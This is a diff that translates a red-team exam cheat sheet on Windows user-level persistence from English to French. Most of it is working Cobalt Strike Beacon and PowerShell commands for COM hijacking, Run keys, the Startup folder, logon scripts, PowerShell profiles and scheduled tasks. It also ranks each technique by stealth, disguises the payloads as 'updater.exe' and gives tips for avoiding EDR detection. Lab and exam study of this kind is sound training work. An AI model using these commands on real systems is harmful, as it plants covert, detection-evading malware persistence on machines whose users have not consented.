@@ -1,38 +1,38 @@
-# Persistence (User-Land)
+# Persistence — Contexte utilisateur
 
-> User-land only — no admin required. Elevated persistence techniques are in `cheatsheets/elevated-persistence.md`.
-> **Exam critical:** Set persistence before taking a break. Save Progress does not preserve running Beacons or P2P chains.
+> Ces techniques de **Persistence** s'exécutent dans le contexte utilisateur, sans privilèges administrateur. Pour la persistence élevée, voir `cheatsheets/elevated-persistence.md`.
+> **Important pour l'examen :** mettre en place la persistence avant une pause. L'option Save Progress ne préserve pas les Beacons actifs ni les chaînes P2P.
 
 ---
 
-## OPSEC Ranking
+## Classement OPSEC
 
-| Technique | OPSEC | Trigger | Admin needed |
+| Technique | OPSEC | Déclencheur | Admin requis |
 |-----------|-------|---------|-------------|
-| COM Hijacking (HKCU) | SAFE | Application load | No |
-| Logon Script (HKCU env key) | CAUTION | User logon | No |
-| PowerShell Profile | CAUTION | Any PS window opened | No |
-| Scheduled Task | CAUTION | Logon / time / event | No |
-| Registry Run Key | UNSAFE | User logon | No |
-| Startup Folder | UNSAFE | User logon | No |
+| COM Hijacking (HKCU) | SAFE | Chargement d'une application | Non |
+| Logon Script (clé Environment HKCU) | CAUTION | Connexion utilisateur | Non |
+| PowerShell Profile | CAUTION | Ouverture d'une fenêtre PS | Non |
+| Scheduled Task | CAUTION | Connexion / horaire / événement | Non |
+| Registry Run Key | UNSAFE | Connexion utilisateur | Non |
+| Startup Folder | UNSAFE | Connexion utilisateur | Non |
 
-> **Exam preference order: COM Hijack → Logon Script → Scheduled Task → Registry Run Key**
+> **Ordre de préférence indiqué pour l'examen :** COM Hijack → Logon Script → Scheduled Task → Registry Run Key.
 
 ---
 
-## 1. COM Hijacking (HKCU) — OPSEC-SAFE
+## COM Hijacking (HKCU) — OPSEC-SAFE
 
-Best exam-day persistence. HKCU write only (no admin), no new scheduled task or run key event.
+Méthode de persistence privilégiée dans ces notes : écriture dans HKCU uniquement (sans admin), sans création de Scheduled Task ni d'événement associé à une Run Key.
 
-**Find hijack opportunities with ProcMon:**
+**Rechercher les possibilités de hijack avec ProcMon :**
 ```
 Operation = RegOpenKey
 Path contains CLSID
 Result = NAME NOT FOUND
 ```
-Export CSV → frequency analysis → find a CLSID loaded a modest number of times (not thousands/minute).
+Exporter le CSV, analyser les fréquences et rechercher un CLSID chargé occasionnellement plutôt que des milliers de fois par minute.
 
-**Check if CLSID exists only in HKLM (not HKCU) — hijackable:**
+**Vérifier qu'un CLSID existe dans HKLM mais pas dans HKCU — cas potentiellement hijackable :**
 ```powershell
 # In HKLM (exists):
 Get-Item "HKLM:\Software\Classes\CLSID\{<CLSID>}"
@@ -42,7 +42,7 @@ Get-Item "HKCU:\Software\Classes\CLSID\{<CLSID>}"
 # Error = does not exist = hijackable
 ```
 
-**Create the hijack:**
+**Configurer le COM hijack :**
 ```powershell
 # Point HKCU CLSID → your DLL payload (in a writable, allowed path)
 $clsid = '{<CLSID from procmon>}'
@@ -53,9 +53,9 @@ New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
                  -Name 'ThreadingModel' -Value 'Both' -Force
 ```
 
-**Trigger:** Log out and back in — the application that loads this COM object (e.g. `DllHost.exe`) will load your DLL and callback with a new Beacon.
+**Déclencheur :** fermer puis rouvrir la session. L'application qui charge l'objet COM (par exemple `DllHost.exe`) charge alors la DLL et peut déclencher un nouveau callback Beacon.
 
-**CS Beacon commands:**
+**Commandes du Beacon Cobalt Strike :**
 ```cs
 // Upload DLL payload to target first
 beacon> upload C:\Payloads\http_x64.dll
@@ -66,31 +66,31 @@ beacon> reg_set HKCU Software\Classes\CLSID\{<CLSID>}\InprocServer32 "" REG_SZ C
 beacon> reg_set HKCU Software\Classes\CLSID\{<CLSID>}\InprocServer32 ThreadingModel REG_SZ Both
 ```
 
-**Remove when done:**
+**Supprimer après utilisation :**
 ```cs
 beacon> reg_delete HKCU Software\Classes\CLSID\{<CLSID>}
 ```
 
 ---
 
-## 2. Registry Run Keys — OPSEC-CAUTION
+## Registry Run Keys — OPSEC-CAUTION
 
-Persistent across every reboot. Runs on every user logon. Well-known detection point — EDR and Defender monitor run keys.
+Persistence après redémarrage : exécution à chaque connexion utilisateur. Les Run Keys sont des points de détection connus, surveillés par les EDR et Defender.
 
-**Key locations (user-land, no admin):**
+**Emplacements Registry en contexte utilisateur (sans admin) :**
 ```
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run       ← persistent (every logon)
 HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce  ← deleted after first run
 ```
 
-**Drop payload to a low-profile path first:**
+**Déposer d'abord le payload dans un chemin peu visible :**
 ```cs
 beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
 beacon> upload C:\Payloads\http_x64.exe
 beacon> mv http_x64.exe updater.exe
 ```
 
-**Set run key:**
+**Configurer la Run Key :**
 ```cs
 // reg_set syntax: hive  key  value  type  data
 beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe
@@ -99,18 +99,18 @@ beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_S
 beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run
 ```
 
-**Remove:**
+**Suppression :**
 ```cs
 beacon> reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
 ```
 
 ---
 
-## 3. Startup Folder — OPSEC-CAUTION
+## Startup Folder — OPSEC-CAUTION
 
-Executables in the startup folder run on user logon. Simple but highly visible.
+Les exécutables placés dans le Startup Folder se lancent à la connexion utilisateur. C'est une technique simple mais très visible.
 
-**Path:**
+**Chemin :**
 ```
 C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
 ```
@@ -120,38 +120,38 @@ beacon> upload C:\Payloads\http_x64.exe
 beacon> mv http_x64.exe "C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
 ```
 
-**Remove:**
+**Suppression :**
 ```cs
 beacon> rm "C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
 ```
 
 ---
 
-## 4. Logon Script (HKCU Environment Key)
+## Logon Script — Clé Environment HKCU
 
-`UserInitMprLogonScript` value in the Environment registry key executes a program on user logon.
+La valeur `UserInitMprLogonScript` de la clé Registry Environment permet de lancer un programme à la connexion utilisateur.
 
 ```cs
 beacon> reg_set HKCU Environment UserInitMprLogonScript REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe
 ```
 
-**Remove:**
+**Suppression :**
 ```cs
 beacon> reg_delete HKCU Environment UserInitMprLogonScript
 ```
 
 ---
 
-## 5. PowerShell Profile
+## PowerShell Profile
 
-`$PROFILE` script executes when any new PowerShell window is opened by the user.
+Le script `$PROFILE` est exécuté lorsqu'une nouvelle fenêtre PowerShell est ouverte par l'utilisateur.
 
-**Profile path (Windows PowerShell):**
+**Chemin du profil Windows PowerShell :**
 ```
 C:\Users\<user>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 ```
 
-**Profile content — use Start-Job to avoid blocking the PS prompt:**
+**Contenu du profil : utiliser Start-Job pour ne pas bloquer l'invite PowerShell :**
 ```powershell
 Start-Job -ScriptBlock {
     Start-Sleep -Seconds 5
@@ -166,20 +166,20 @@ beacon> upload C:\Payloads\Microsoft.PowerShell_profile.ps1
 beacon> mv Microsoft.PowerShell_profile.ps1 C:\Users\pchilds\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 ```
 
-> **Do not put blocking code in the profile** — the user will not get a PS prompt until the script completes.
+> **Ne pas placer de code bloquant dans le profil** : l'utilisateur ne retrouvera l'invite PowerShell qu'après la fin du script.
 
-**Remove:**
+**Suppression :**
 ```cs
 beacon> rm C:\Users\pchilds\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 ```
 
 ---
 
-## 6. Scheduled Task — OPSEC-CAUTION
+## Scheduled Task — OPSEC-CAUTION
 
-Task Scheduler supports triggers: logon, startup, idle, time, system event.
+Task Scheduler accepte plusieurs déclencheurs : connexion, démarrage, inactivité, horaire ou événement système.
 
-**Task XML template (logon trigger):**
+**Template XML de tâche (déclenchement à la connexion) :**
 ```xml
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -211,12 +211,12 @@ beacon> run schtasks /create /tn \Beacon /xml task.xml       // OPSEC-CAUTION �
 // Task name must start with \
 ```
 
-**OPSEC-SAFE alternative — COM object via powerpick (no schtasks.exe, no child process):**
+**Alternative OPSEC-SAFE — objet COM via powerpick (sans schtasks.exe ni child process) :**
 ```cs
 beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe'; Register-ScheduledTask -TaskName 'Updater' -Action $action -RunLevel Highest
 ```
 
-**OPSEC-SAFE enumeration alternatives:**
+**Alternatives d'énumération OPSEC-SAFE :**
 ```cs
 // Seatbelt via execute-assembly (in-memory, no child process)
 beacon> execute-assembly Seatbelt.exe ScheduledTasks
@@ -225,10 +225,10 @@ beacon> execute-assembly Seatbelt.exe ScheduledTasks
 beacon> powerpick Get-ScheduledTask | Select TaskName,TaskPath,State | Format-List
 ```
 
-> **Event IDs generated on task creation:** `4698` (Task Scheduler created a task) — logged on the local host.
-> `schtasks.exe` spawned as a child of beacon is high-confidence EDR telemetry. Prefer `powerpick`/`execute-assembly` path in exam.
+> **Event ID généré lors de la création d'une tâche :** `4698` (nouvelle Scheduled Task), enregistré sur l'hôte local.
+> Le lancement de `schtasks.exe` comme child process du Beacon est identifiable par l'EDR. Ces notes privilégient `powerpick` ou `execute-assembly` pendant l'examen.
 
-**Remove:**
+**Suppression :**
 ```cs
 beacon> shell schtasks /delete /tn \Beacon /f               // OPSEC-UNSAFE
 beacon> run schtasks /delete /tn \Beacon /f                 // OPSEC-CAUTION
@@ -238,7 +238,7 @@ beacon> powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false
 
 ---
 
-## Exam Day — Persistence Workflow
+## Workflow Persistence pour l'examen
 
 ```
 1. After first Beacon checks in — immediately set persistence before anything else
@@ -253,7 +253,7 @@ beacon> powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false
 
 ---
 
-## Quick Reference
+## Référence rapide
 
 ```
 COM HIJACK:    reg_set HKCU Software\Classes\CLSID\{GUID}\InprocServer32 "" REG_SZ <dll_path>
